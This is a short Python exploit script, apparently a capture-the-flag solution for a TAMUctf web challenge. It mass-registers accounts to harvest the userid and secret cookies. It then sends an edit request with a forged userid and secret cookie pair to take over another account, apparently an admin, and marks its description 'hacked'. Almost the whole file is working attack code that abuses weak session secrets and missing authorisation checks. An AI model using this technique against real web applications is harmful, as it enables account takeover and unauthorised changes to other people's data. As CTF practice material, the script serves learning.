#!/usr/bin/env python3

import requests

def test():

	for i in range(100):
		s = requests.session()

		#url_main = 'http://web6.tamuctf.com/'
		url_register = 'http://web6.tamuctf.com/register_user'
		data = {
			'firstname': 'a',
			'lastname': 'a',
			'password': 'a',
			'phone': '1234567891',
			'Submit': 'Register'
		}
		res = s.post(url_register, data=data, allow_redirects=False)
		set_cookie = res.headers['Set-Cookie']

		userid = set_cookie.split('serid=', 1)[1].split(';', 1)[0]
		secret = set_cookie.split('secret=', 1)[1].split(';', 1)[0]
		print(userid, secret)

def main():
	url_edit = 'http://web6.tamuctf.com/apply_edit'
	cookies = {'userid': '407', 'secret': 'NQDHKFWPEJOO5XXQ'}

	# 1337-admin	Joe Joeson	1337-admin@l337secur1ty.hak
	data = {
		'firstname': 'a',
		'lastname': 'asas',
		'password': '1234',
		'phone': '1234567891',
		'description': 'hacked',
		'Submit': 'Apply'
	}
	res = requests.post(url_edit,
		data=data, 
		cookies=cookies,
		allow_redirects=False)
	print(res.headers)
	print(res.content)

if __name__ == '__main__':
	main()
